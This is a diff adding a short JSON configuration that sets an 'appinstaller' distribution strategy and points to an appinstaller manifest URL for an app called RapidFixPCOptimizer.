@@ -1,0 +1,7 @@
+{
+	"$schema": "https://anthelion.unownplain.dev/schema.json",
+	"strategy": "appinstaller",
+	"appinstaller": {
+		"url": "https://downloads.rapidfixeasttexas.com/RapidFixPCOptimizer.appinstaller"
+	}
+}
